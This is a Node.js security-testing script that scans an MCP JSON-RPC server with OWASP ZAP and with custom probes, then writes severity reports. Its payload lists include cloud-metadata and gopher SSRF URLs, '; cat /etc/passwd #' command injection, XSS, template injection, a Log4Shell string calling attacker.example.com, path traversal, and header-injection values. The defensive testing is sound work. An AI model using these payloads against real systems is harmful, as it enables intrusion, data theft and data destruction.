/**
 * DAST — Dynamic Application Security Testing
 *
 * Two-layer scan:
 *
 * Layer 1 — OWASP ZAP (via Docker)
 *   zap-baseline.py passive scan: spider the server, run ~60 passive analysis rules.
 *   Detects: missing security headers, cookie flags, info disclosure, insecure TLS,
 *   CORS misconfiguration, cache directives, and ~55 other passive checks.
 *   No active attack payloads in baseline mode — safe to run against production.
 *
 * Layer 2 — MCP application probes (custom fetch)
 *   Active probes specific to the MCP JSON-RPC API surface that ZAP cannot discover
 *   automatically: authentication enforcement, SSRF via tool arguments, injection
 *   via tool arguments, path traversal, error disclosure.
 *
 * Produces:
 *   security-reports/dast-zap.json        raw ZAP JSON report
 *   security-reports/dast-zap.html        ZAP HTML report (human readable)
 *   security-reports/dast-probes.json     MCP application probe results
 *   security-reports/dast-report.md       consolidated human + LLM summary
 *
 * Prerequisites:
 *   Docker must be running.
 *   The MCP server must be reachable at --base (default http://localhost:3000).
 *   docker compose up -d   OR   kubectl port-forward svc/mcp-server 3000:80
 *
 * Usage:
 *   node scripts/scan-dast.mjs
 *   node scripts/scan-dast.mjs --base http://localhost:3000 --token MY_TOKEN
 *   node scripts/scan-dast.mjs --skip-zap    (MCP probes only, no Docker required)
 *   node scripts/scan-dast.mjs --active      (ZAP full active scan — DO NOT run on production)
 */

import { spawnSync } from 'node:child_process';
import { writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { parseArgs } from 'node:util';
import { platform } from 'node:os';

const { values: args } = parseArgs({
  options: {
    base:       { type: 'string',  default: 'http://localhost:3000' },
    token:      { type: 'string',  default: '' },
    'skip-zap': { type: 'boolean', default: false },
    active:     { type: 'boolean', default: false },
  },
  strict: false,
});

const BASE  = args.base.replace(/\/$/, '');
const TOKEN = args.token;
const OUT   = 'security-reports';
mkdirSync(OUT, { recursive: true });

const zapFindings   = [];
const probeFindings = [];
const probesPassed  = [];

// ── Helpers ───────────────────────────────────────────────────────────────────

function finding(store, severity, id, description, detail = '') {
  store.push({ severity, id, description, detail });
  console.error(`  [${severity}] ${id}: ${description}`);
}
function pass(note) {
  probesPassed.push(note);
  console.log(`  [PASS] ${note}`);
}

/**
 * Returns true when body is a valid JSON-RPC 2.0 envelope.
 * A transport-layer rejection (e.g. 406 for a missing Accept header) never
 * produces an envelope — so any probe whose response fails this check never
 * reached a tool handler and cannot be recorded as a security PASS.
 */
function isJsonRpcEnvelope(body) {
  try {
    const j = JSON.parse(body);
    return typeof j === 'object' && j !== null &&
           j.jsonrpc === '2.0' && ('result' in j || 'error' in j);
  } catch {
    return false;
  }
}

async function probe(method, path, opts = {}) {
  const url = `${BASE}${path}`;
  // Accept is required by the MCP Streamable HTTP transport — the SDK rejects
  // requests without it with 406 (webStandardStreamableHttp.js:380). It must
  // be in the default headers so every probe reaches the application layer.
  const headers = {
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/event-stream',
    ...(opts.headers ?? {}),
  };
  try {
    const res = await fetch(url, {
      method,
      headers,
      body: opts.body !== undefined ? JSON.stringify(opts.body) : undefined,
      signal: AbortSignal.timeout(10_000),
      redirect: 'manual',
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, headers: Object.fromEntries(res.headers), body: text };
  } catch (err) {
    return { status: 0, headers: {}, body: '', error: err.message };
  }
}

const authHeaders = TOKEN ? { Authorization: `Bearer ${TOKEN}` } : {};

// ── Pre-flight: confirm server is up ─────────────────────────────────────────

console.log(`[DAST] Target: ${BASE}`);
const health = await probe('GET', '/healthz');
if (health.status !== 200) {
  console.error(`[DAST] Server not reachable (GET /healthz → ${health.status || health.error}).`);
  console.error('       Start the server first: docker compose up -d');
  process.exit(2);
}
console.log('[DAST] Server is up.\n');

// ── Positive control: MCP transport reachability ──────────────────────────────
// Issue a well-formed tools/list call and require a valid JSON-RPC envelope
// back. If this fails, every subsequent "PASS" would be meaningless — exit 2
// rather than write a report full of phantom security assurances.
// (This guard would have caught the original bug: missing Accept → every probe
//  returned 406, which our code silently recorded as "SSRF blocked".)
console.log('[DAST] Positive control: confirming MCP transport...');
const positiveControlRes = await probe('POST', '/mcp', {
  headers: { ...authHeaders },
  body: { jsonrpc: '2.0', method: 'tools/list', id: 'pc-1' },
});
if (!isJsonRpcEnvelope(positiveControlRes.body)) {
  console.error('[DAST] PROBE HARNESS FAILURE: tools/list did not return a JSON-RPC envelope.');
  console.error(`       Status: ${positiveControlRes.status}  Body: ${positiveControlRes.body.slice(0, 300)}`);
  if (positiveControlRes.status === 406) {
    console.error('       Cause: server rejected the Accept header — probe transport is broken.');
  } else if (positiveControlRes.status === 401 || positiveControlRes.status === 403) {
    console.error('       Cause: authentication required. Provide --token $MCP_AUTH_TOKEN.');
  }
  console.error('       Aborting — cannot verify security properties without a working probe transport.');
  process.exit(2);
}
const positiveControlBody = JSON.parse(positiveControlRes.body);
const availableTools = positiveControlBody.result?.tools ?? [];
console.log(`[DAST] Positive control passed — ${availableTools.length} tools available.\n`);

// ── Layer 1: OWASP ZAP ────────────────────────────────────────────────────────

if (!args['skip-zap']) {
  console.log('[DAST] Layer 1: OWASP ZAP baseline scan');

  if (!spawnSync('docker', ['info'], { encoding: 'utf8', stdio: 'pipe' }).stdout) {
    console.error('[DAST] Docker not running. Start Docker or use --skip-zap for MCP probes only.');
    process.exit(2);
  }

  // On macOS Docker Desktop, containers cannot reach host `localhost` — use host.docker.internal
  const isLinux     = platform() === 'linux';
  const zapTarget   = isLinux ? BASE : BASE.replace(/localhost|127\.0\.0\.1/, 'host.docker.internal');
  const jsonReportContainer = '/zap/wrk/dast-zap.json';
  const htmlReportContainer = '/zap/wrk/dast-zap.html';

  const zapScript = args.active ? 'zap-full-scan.py' : 'zap-baseline.py';
  console.log(`[DAST] ZAP script: ${zapScript}${args.active ? ' (ACTIVE — do not run on production)' : ' (passive)'}`);
  console.log(`[DAST] ZAP target: ${zapTarget}`);
  console.log('[DAST] This takes 2–5 minutes…\n');

  // Mount the repo security/ directory so the rules-config file is accessible
  // inside the container at /zap/security/zap-rules.conf.
  const zapRulesConf = `${process.cwd()}/security/zap-rules.conf`;
  const hasRulesConf = existsSync(zapRulesConf);

  const dockerArgs = [
    'run', '--rm',
    '-v', `${process.cwd()}/${OUT}:/zap/wrk/:rw`,
    ...(hasRulesConf ? ['-v', `${zapRulesConf}:/zap/security/zap-rules.conf:ro`] : []),
    ...(isLinux ? ['--network', 'host'] : ['--add-host', 'host.docker.internal:host-gateway']),
    'ghcr.io/zaproxy/zaproxy:stable',
    zapScript,
    '-t', zapTarget,
    '-J', 'dast-zap.json',
    '-r', 'dast-zap.html',
    '-I',  // don't fail on warnings — we handle exit codes ourselves
    ...(hasRulesConf ? ['-c', '/zap/security/zap-rules.conf'] : []),
    ...(args.active ? [] : []),
  ];

  const zapResult = spawnSync('docker', dockerArgs, {
    encoding: 'utf8',
    timeout: 600_000,
    stdio: ['pipe', 'inherit', 'inherit'],
  });

  // ZAP exits 1 when it finds warnings, 2 when it finds alerts — both are expected
  if (zapResult.status !== null && zapResult.status > 2) {
    console.error(`[DAST] ZAP exited with unexpected code ${zapResult.status}`);
  }

  const zapJsonPath = `${OUT}/dast-zap.json`;
  if (existsSync(zapJsonPath)) {
    const zapRaw = JSON.parse(
      (await import('node:fs')).readFileSync(zapJsonPath, 'utf8')
    );

    // ZAP JSON format: { site: [{ alerts: [{ riskcode, name, desc, solution, instances, ... }] }] }
    const RISK = { '0': 'INFO', '1': 'LOW', '2': 'MODERATE', '3': 'HIGH' };
    const alerts = zapRaw.site?.flatMap(s => s.alerts ?? []) ?? [];
    for (const alert of alerts) {
      const severity = RISK[String(alert.riskcode)] ?? 'INFO';
      const instances = alert.instances?.map(i => i.uri).join(', ') ?? '';
      zapFindings.push({
        severity,
        id: `ZAP_${alert.pluginid ?? alert.alertRef ?? 'UNKNOWN'}`,
        description: alert.name,
        detail: `${alert.desc?.slice(0, 200) ?? ''} | Instances: ${instances.slice(0, 200)}`,
        solution: alert.solution?.slice(0, 300) ?? '',
        cweid: alert.cweid,
        wascid: alert.wascid,
      });
    }
    console.log(`\n[DAST] ZAP: ${zapFindings.length} alerts (HTML report: ${OUT}/dast-zap.html)`);
  } else {
    console.warn(`[DAST] ZAP JSON report not found at ${zapJsonPath}`);
  }
} else {
  console.log('[DAST] --skip-zap set — skipping ZAP layer\n');
}

// ── Layer 2: MCP application probes ──────────────────────────────────────────

console.log('[DAST] Layer 2: MCP application probes\n');

// HTTP statuses of every tool-call probe. After all probes complete, if every
// status is identical and non-200, the payloads never reached tool handlers.
const toolCallProbeStatuses = [];

const mcpPost = (body) => probe('POST', '/mcp', {
  headers: { ...authHeaders, 'Content-Type': 'application/json' },
  body,
});

// ── Schema-driven probe payload sets ─────────────────────────────────────────
// These are consumed by buildProbesForTool(), which maps them onto parameters
// by name and JSON Schema type. The classification logic here mirrors
// src/tools/definitions.test.ts (Phase 4.1 contract test).

const SSRF_TARGETS = [
  { label: 'AWS_METADATA',      url: 'http://169.254.169.254/latest/meta-data/' },
  { label: 'GCP_METADATA',      url: 'http://metadata.google.internal/computeMetadata/v1/' },
  { label: 'LOCALHOST_ADMIN',   url: 'http://localhost/admin' },
  { label: 'RFC1918_10X',       url: 'http://10.0.0.1/' },
  { label: 'RFC1918_192168',    url: 'http://192.168.1.1/' },
  { label: 'LINK_LOCAL',        url: 'http://169.254.0.1/' },
  { label: 'FILE_PROTO',        url: 'file:///etc/passwd' },
  { label: 'GOPHER_PROTO',      url: 'gopher://127.0.0.1:6379/_FLUSHALL%0D%0A' },
];

const INJECTION_PAYLOADS = [
  { label: 'XSS',        value: '<script>alert(document.domain)</script>' },
  { label: 'SSTI',       value: '{{7*7}}__${7*7}__<%=7*7%>' },
  { label: 'CMD_INJECT', value: '; cat /etc/passwd #' },
  { label: 'PATH_TRAV',  value: '../../../../../../etc/passwd' },
  { label: 'NULL_BYTE',  value: 'test\x00injection' },
  { label: 'LOG4SHELL',  value: '${jndi:ldap://attacker.example.com/a}' },
];

// Path traversal payloads for *Path / filename parameters (e.g. download_file.outputPath).
// Detection: a successful ARBITRARY_WRITE finding fires when savedPath in the result matches
// a sensitive absolute path — meaning the write bypassed any path restriction.
const PATH_TRAVERSAL_PAYLOADS = [
  { label: 'ABSOLUTE_SENSITIVE',  value: '/etc/passwd' },
  { label: 'ABSOLUTE_APP_CODE',   value: '/app/dist/index.js' },
  { label: 'RELATIVE_TRAVERSAL',  value: '../../../../etc/passwd' },
  { label: 'ENCODED_TRAVERSAL',   value: '/tmp/..%2f..%2fetc%2fpasswd' },
  { label: 'NULL_BYTE_TRAVERSAL', value: '/tmp/test\x00.pdf' },
];

// CRLF / header-injection payloads for z.record(string,string) header parameters.
const CRLF_PAYLOADS = [
  { label: 'CRLF_INJECT',   key: 'X-Injected',    value: 'test\r\nX-Injected-2: evil' },
  { label: 'AUTH_FORWARD',  key: 'Authorization',  value: 'Bearer attacker-forwarded-token' },
  { label: 'HOST_OVERRIDE', key: 'Host',           value: 'attacker.example.com' },
];

/**
 * Map a JSON Schema property descriptor onto a payload class.
 * Returns null for parameters with no known attack surface (enums, booleans, etc.)
 * Mirrors the classification logic in src/tools/definitions.test.ts (Phase 4.1).
 */
function classifyParam(paramName, jsonSchema) {
  const n = paramName.toLowerCase();
  if (n === 'url' || n === 'urls') return 'ssrf';
  if (n === 'outputpath' || n.endsWith('path') || n === 'filename') return 'path';
  if (n === 'headers' && jsonSchema?.type === 'object') return 'headers';
  if (n === 'query' || n === 'jobid') return 'injection';
  return null;
}

/**
 * Return a safe, benign default value for a required parameter that is NOT the
 * one currently being probed. Uses values that reach tool handlers without
 * meaningful side-effects (example.com is publicly routable; a nonexistent jobId
 * returns a clean JSON-RPC error without DB side-effects).
 */
function safeDefaultArg(paramName, jsonSchema) {
  const n = paramName.toLowerCase();
  if (n === 'url')  return 'http://example.com/robots.txt';
  if (n === 'urls') return ['http://example.com/robots.txt'];
  if (n === 'outputpath' || n.endsWith('path')) return '/tmp/probe-safe-default';
  if (n === 'jobid') return 'probe-nonexistent-job-safe';
  if (jsonSchema?.type === 'string')  return 'probe-safe-string';
  if (jsonSchema?.type === 'number' || jsonSchema?.type === 'integer') return 1;
  if (jsonSchema?.type === 'boolean') return false;
  if (jsonSchema?.type === 'array')   return [];
  return undefined;
}

/**
 * Generate all probe specs for a single tool from its JSON Schema (as returned
 * by tools/list). Each spec carries enough information to build the MCP call and
 * evaluate the response.
 *
 * Coverage contract: every tool that appears in tools/list must have at least
 * one probe, OR appear in NO_ATTACK_SURFACE_TOOLS. The coverage gate below
 * enforces this and exits 2 if it fails, converting "forgot to probe the new
 * tool" from an invisible miss into a red scan.
 */
function buildProbesForTool(tool) {
  const props    = tool.inputSchema?.properties ?? {};
  const required = new Set(tool.inputSchema?.required ?? []);
  const probes   = [];

  for (const [paramName, paramSchema] of Object.entries(props)) {
    const cls = classifyParam(paramName, paramSchema);
    if (!cls) continue;

    // Build a complete, valid argument object: safe defaults for all required
    // params except the one being probed (which gets the attack payload).
    const baseArgs = {};
    for (const req of required) {
      if (req === paramName) continue;
      const val = safeDefaultArg(req, props[req]);
      if (val !== undefined) baseArgs[req] = val;
    }

    let payloads;
    if (cls === 'ssrf') {
      payloads = SSRF_TARGETS.map(t => ({
        label: t.label,
        // Array-typed url params (e.g. fetch_urls.urls) need the URL wrapped
        value: paramSchema.type === 'array' ? [t.url] : t.url,
      }));
    } else if (cls === 'path') {
      payloads = PATH_TRAVERSAL_PAYLOADS;
    } else if (cls === 'headers') {
      payloads = CRLF_PAYLOADS.map(p => ({
        label: p.label,
        value: { [p.key]: p.value },
      }));
    } else {
      // injection
      payloads = INJECTION_PAYLOADS;
    }

    for (const p of payloads) {
      probes.push({
        toolName:     tool.name,
        paramName,
        payloadClass: cls,
        label:        `${tool.name}.${paramName}/${p.label}`,
        args:         { ...baseArgs, [paramName]: p.value },
      });
    }
  }

  return probes;
}

/**
 * Evaluate a JSON-RPC response body for signs that an attack payload succeeded.
 * Called AFTER isJsonRpcEnvelope() has confirmed the response reached a handler.
 */
function evaluateProbeResponse({ payloadClass, label, args, paramName }, r) {
  const body = r.body;
  const tag  = label.replace(/[^A-Z0-9]/gi, '_').toUpperCase();

  if (payloadClass === 'ssrf') {
    const hit = body.includes('ami-id') || body.includes('instance-type') ||
                body.includes('project-id') || body.includes('computeMetadata') ||
                body.includes('root:x:0:0');
    hit
      ? finding(probeFindings, 'CRITICAL', `SSRF_${tag}`,
          `SSRF succeeded — internal resource accessed via ${label}`, body.slice(0, 300))
      : pass(`SSRF blocked: ${label}`);

  } else if (payloadClass === 'path') {
    // For write-path tools (e.g. download_file), an ARBITRARY_WRITE finding fires
    // when savedPath in a successful result is a sensitive absolute path.
    const successfulSensitiveWrite =
      body.includes('"savedPath"') && (
        body.includes('"/etc/')   ||
        body.includes('"/app/dist/') ||
        body.includes('"/../')
      );
    const lfi     = body.includes('root:x:0:0') || body.includes('/bin/bash');
    const appCode = body.includes('__esModule') || body.includes('Object.defineProperty(exports');
    successfulSensitiveWrite
      ? finding(probeFindings, 'HIGH', `ARBITRARY_WRITE_${tag}`,
          `Arbitrary file write succeeded — probe path accepted outside allowed directories`, body.slice(0, 300))
      : lfi
        ? finding(probeFindings, 'CRITICAL', `PATH_TRAVERSAL_LFI_${tag}`,
            `Path traversal succeeded — /etc/passwd content in response`, body.slice(0, 300))
        : appCode
          ? finding(probeFindings, 'HIGH', `PATH_TRAVERSAL_APP_CODE_${tag}`,
              `Path traversal may have returned compiled application code`, body.slice(0, 300))
          : pass(`Path traversal blocked: ${label}`);

  } else if (payloadClass === 'headers') {
    // CRLF injection: the injected trailer header appears in the response
    const crlf = body.includes('X-Injected-2:');
    crlf
      ? finding(probeFindings, 'HIGH', `CRLF_INJECT_${tag}`,
          `CRLF injection succeeded — injected header reflected in response`, body.slice(0, 300))
      : pass(`Header injection blocked: ${label}`);

  } else {
    // injection (query strings, jobId values, etc.)
    const reflected = body.includes('<script>') && body.includes('alert(');
    const lfi       = body.includes('root:x:0:0') || body.includes('/bin/bash');
    const ssti      = typeof args[paramName] === 'string' &&
                      args[paramName].includes('7*7') &&
                      body.includes('49') &&
                      !body.includes('7*7');
    reflected
      ? finding(probeFindings, 'HIGH',     `XSS_REFLECTED_${tag}`,
          'XSS payload reflected unescaped', body.slice(0, 300))
      : lfi
        ? finding(probeFindings, 'CRITICAL', `LFI_${tag}`,
            'Local file inclusion succeeded', body.slice(0, 300))
        : ssti
          ? finding(probeFindings, 'HIGH',   `SSTI_${tag}`,
              'Server-side template injection', body.slice(0, 300))
          : pass(`Injection safe: ${label}`);
  }
}

// 2.1 Authentication enforcement
console.log('[DAST] 2.1 Authentication enforcement');
if (TOKEN) {
  const unauth = await probe('POST', '/mcp', {
    body: { jsonrpc: '2.0', method: 'tools/list', id: 1 },
  });
  if (unauth.status === 401 || unauth.status === 403) {
    pass(`/mcp rejects unauthenticated requests → ${unauth.status}`);
  } else {
    finding(probeFindings, 'HIGH', 'AUTH_BYPASS_MCP',
      `/mcp returned ${unauth.status} without Authorization header`,
      'Expected 401/403');
  }
} else {
  finding(probeFindings, 'LOW', 'AUTH_NO_TOKEN',
    'No --token provided — auth enforcement not verified',
    'Re-run: node scripts/scan-dast.mjs --token $MCP_AUTH_TOKEN');
}

// Probe endpoints must be unauthenticated
for (const path of ['/healthz', '/readyz']) {
  const r = await probe('GET', path);
  r.status === 200
    ? pass(`${path} accessible without auth (correct — needed for k8s probes)`)
    : finding(probeFindings, 'MODERATE', `PROBE_BLOCKED_${path.slice(1).toUpperCase()}`,
        `${path} → ${r.status}: Kubernetes liveness/readiness probes will fail`);
}

// 2.2 Schema-driven probes — generated from the live tools/list response
//
// Payload classes applied by parameter name and JSON Schema type:
//   ssrf      → url / urls parameters
//   path      → *Path / filename parameters (e.g. download_file.outputPath)
//   headers   → z.record(string,string) header maps (e.g. fetch_url.headers)
//   injection → jobId string parameters (query removed in POPIA Phase 0 — dead field)
//
// Coverage gate: any tool from tools/list with zero generated probes that is
// NOT in NO_ATTACK_SURFACE_TOOLS causes the scan to exit 2. This converts
// "forgot to probe the new tool" into an explicit red scan — the same guarantee
// the positive control provides for the harness transport.
//
// Mirrors the contract test in src/tools/definitions.test.ts (Phase 4.1).

// Tools with no attack-relevant parameters — explicitly acknowledged, not silent gaps.
const NO_ATTACK_SURFACE_TOOLS = new Set(['health_check', 'crawl_list']);

const allGeneratedProbes = availableTools.flatMap(t => buildProbesForTool(t));

// Coverage gate check
const probeCountPerTool = new Map(availableTools.map(t => [t.name, 0]));
for (const p of allGeneratedProbes) {
  probeCountPerTool.set(p.toolName, (probeCountPerTool.get(p.toolName) ?? 0) + 1);
}
const uncoveredTools = availableTools.filter(t =>
  probeCountPerTool.get(t.name) === 0 && !NO_ATTACK_SURFACE_TOOLS.has(t.name)
);
if (uncoveredTools.length > 0) {
  for (const t of uncoveredTools) {
    finding(probeFindings, 'CRITICAL',
      `PROBE_COVERAGE_MISSING_${t.name.replace(/[^A-Z0-9]/gi, '_').toUpperCase()}`,
      `Tool "${t.name}" has zero generated probes — add probe coverage in scripts/scan-dast.mjs`,
      `Input schema params: ${Object.keys(t.inputSchema?.properties ?? {}).join(', ') || '(none)'}`);
  }
  const names = uncoveredTools.map(t => t.name).join(', ');
  console.error(`[DAST] Coverage gate FAIL: ${uncoveredTools.length} tool(s) have zero probes: ${names}`);
  writeFileSync(`${OUT}/dast-probes.json`, JSON.stringify({
    target: BASE, zapSkipped: args['skip-zap'], probeFindings, probesPassed, coverageGateFailure: true,
  }, null, 2));
  process.exit(2);
}

// Group by tool for readable progress logging
const probesByTool = {};
for (const p of allGeneratedProbes) {
  (probesByTool[p.toolName] ??= []).push(p);
}
const whitelisted = [...NO_ATTACK_SURFACE_TOOLS].filter(n => availableTools.some(t => t.name === n));
console.log(`[DAST] 2.2 Coverage gate passed — ${availableTools.length} tools, ${allGeneratedProbes.length} generated probes`);
if (whitelisted.length) console.log(`       No-attack-surface whitelist: ${whitelisted.join(', ')}`);
console.log('');

for (const [toolName, toolProbes] of Object.entries(probesByTool)) {
  const classes = [...new Set(toolProbes.map(p => p.payloadClass))].join(', ');
  console.log(`[DAST] 2.2 ${toolName}: ${toolProbes.length} probe(s) [${classes}]`);
  for (const probeSpec of toolProbes) {
    const r = await mcpPost({
      jsonrpc: '2.0', method: 'tools/call', id: 1,
      params: { name: probeSpec.toolName, arguments: probeSpec.args },
    });
    toolCallProbeStatuses.push(r.status);
    if (!isJsonRpcEnvelope(r.body)) {
      finding(probeFindings, 'CRITICAL',
        `PROBE_NO_ENVELOPE_${probeSpec.label.replace(/[^A-Z0-9]/gi, '_').toUpperCase()}`,
        `Probe ${probeSpec.label} got no JSON-RPC envelope — did not reach the tool handler`,
        `Status: ${r.status}  Body: ${r.body.slice(0, 200)}`);
      continue;
    }
    evaluateProbeResponse(probeSpec, r);
  }
}

// Uniform-rejection guard: if every tool-call probe returned the same non-200
// status, the positive control failed to catch a harness problem (e.g. auth
// token was accepted for tools/list but rejected for tools/call). Fail loudly
// rather than produce a report whose PASSes are all false negatives.
if (toolCallProbeStatuses.length > 0) {
  const uniqueStatuses = new Set(toolCallProbeStatuses);
  if (uniqueStatuses.size === 1) {
    const onlyStatus = [...uniqueStatuses][0];
    if (onlyStatus !== 200) {
      finding(probeFindings, 'CRITICAL', 'PROBE_HARNESS_FAILURE',
        `All ${toolCallProbeStatuses.length} tool-call probes returned identical status ${onlyStatus} — probes are not reaching tool handlers`,
        'All SSRF and injection results are unreliable. Fix the probe transport before interpreting any PASSes.');
      writeFileSync(`${OUT}/dast-probes.json`, JSON.stringify({
        target: BASE, zapSkipped: args['skip-zap'], probeFindings, probesPassed,
        harnessFailure: true,
      }, null, 2));
      console.error(`[DAST] PROBE HARNESS FAILURE: all ${toolCallProbeStatuses.length} tool-call probes returned ${onlyStatus}.`);
      console.error('       Cannot verify security properties — aborting.');
      process.exit(2);
    }
  }
}

// 2.3 Error disclosure
console.log('[DAST] 2.3 Error disclosure');
const malformed = await probe('POST', '/mcp', { headers: authHeaders, body: '{"broken":' });
if (/at \w+\s*\(|node_modules\//.test(malformed.body)) {
  finding(probeFindings, 'MODERATE', 'ERROR_STACK_LEAK', 'Stack trace visible in error response', malformed.body.slice(0, 400));
} else {
  pass('Stack trace not exposed in error responses');
}
if (/\/home\/|\/app\/|\/Users\//.test(malformed.body)) {
  finding(probeFindings, 'LOW', 'ERROR_PATH_LEAK', 'Internal file path in error response', malformed.body.slice(0, 400));
} else {
  pass('Internal paths not exposed in error responses');
}

// 2.4 HTTP method enforcement
console.log('[DAST] 2.4 HTTP method enforcement');
for (const method of ['GET', 'PUT', 'PATCH']) {
  const r = await probe(method, '/mcp', { headers: authHeaders });
  [405, 404, 400].includes(r.status)
    ? pass(`${method} /mcp rejected → ${r.status}`)
    : r.status === 200
      ? finding(probeFindings, 'MODERATE', `METHOD_${method}_ACCEPTED`,
          `${method} /mcp returned 200 — only POST should be accepted`)
      : pass(`${method} /mcp → ${r.status}`);
}
// DELETE /mcp → 200 is correct per the MCP Streamable HTTP spec: DELETE is
// the session teardown method and MUST return 200. Do not treat it as a
// method-enforcement violation.
const deleteRes = await probe('DELETE', '/mcp', { headers: authHeaders });
deleteRes.status === 200
  ? pass('DELETE /mcp → 200 (correct — MCP Streamable HTTP session teardown)')
  : finding(probeFindings, 'LOW', 'MCP_DELETE_UNEXPECTED',
      `DELETE /mcp returned ${deleteRes.status} — expected 200 per MCP session teardown spec`);

// 2.5 CORS
console.log('[DAST] 2.5 CORS misconfiguration');
const corsRes = await probe('OPTIONS', '/mcp', {
  headers: {
    ...authHeaders,
    Origin: 'https://evil.example.com',
    'Access-Control-Request-Method': 'POST',
  },
});
const acao = corsRes.headers['access-control-allow-origin'] ?? '';
acao === '*' || acao === 'https://evil.example.com'
  ? finding(probeFindings, 'MODERATE', 'CORS_WILDCARD',
      `CORS allows arbitrary origins: ${acao}`)
  : pass(`CORS restricted: "${acao || '(not set)'}"`);

// ── Report ────────────────────────────────────────────────────────────────────

writeFileSync(`${OUT}/dast-probes.json`, JSON.stringify({
  target: BASE, zapSkipped: args['skip-zap'], probeFindings, probesPassed,
}, null, 2));

const allFindings = [...zapFindings, ...probeFindings];

function fBySev(sev) { return allFindings.filter(f => f.severity === sev); }

function findingTable(list) {
  if (!list.length) return '_None_\n';
  return ['| Severity | ID | Description |', '|---|---|---|',
    ...list.map(f => `| ${f.severity} | \`${f.id}\` | ${f.description.replace(/\|/g, '\\|').slice(0, 100)} |`)
  ].join('\n') + '\n';
}

const now = new Date().toISOString();
const report = `# DAST Report — Dynamic Application Security Testing

**Scanned:** ${now}
**Target:** ${BASE}
**ZAP:** ${args['skip-zap'] ? '⏭️ Skipped (--skip-zap)' : `✅ ${zapFindings.length} alerts`}
**MCP probes:** ${probeFindings.length} findings | ${probesPassed.length} passed
**Auth:** ${TOKEN ? '✅ Bearer token provided' : '⚠️ No token — auth checks limited'}

> ZAP HTML report: \`${OUT}/dast-zap.html\`

## Summary

| Severity | ZAP | Probes | Total |
|---|---|---|---|
| 🔴 Critical | ${zapFindings.filter(f=>f.severity==='HIGH').length} | ${probeFindings.filter(f=>f.severity==='CRITICAL').length} | ${fBySev('CRITICAL').length + zapFindings.filter(f=>f.severity==='HIGH').length} |
| 🟠 High     | — | ${probeFindings.filter(f=>f.severity==='HIGH').length} | ${fBySev('HIGH').length} |
| 🟡 Moderate | ${zapFindings.filter(f=>f.severity==='MODERATE').length} | ${probeFindings.filter(f=>f.severity==='MODERATE').length} | ${fBySev('MODERATE').length} |
| 🔵 Low/Info | ${zapFindings.filter(f=>['LOW','INFO'].includes(f.severity)).length} | ${probeFindings.filter(f=>['LOW','INFO'].includes(f.severity)).length} | ${fBySev('LOW').length + fBySev('INFO').length} |

---

## ZAP Findings
${findingTable(zapFindings)}
${zapFindings.filter(f => f.solution).map(f =>
  `**${f.id}** — Solution: ${f.solution}`
).join('\n\n') || ''}

## MCP Application Probe Findings
${findingTable(probeFindings)}

## Passed Checks (${probesPassed.length})
${probesPassed.map(p => `- ${p}`).join('\n') || '_None_'}

---

Raw data: \`${OUT}/dast-zap.json\`, \`${OUT}/dast-probes.json\`
Full ZAP report: \`${OUT}/dast-zap.html\`
`;

writeFileSync(`${OUT}/dast-report.md`, report);
console.log(`\n[DAST] Report written to ${OUT}/dast-report.md`);

const critical = allFindings.filter(f => ['CRITICAL','HIGH'].includes(f.severity)).length;
if (critical > 0) {
  console.error(`[DAST] FAIL — ${critical} critical/high findings`);
  process.exit(1);
}
console.log('[DAST] PASS — no critical or high findings');
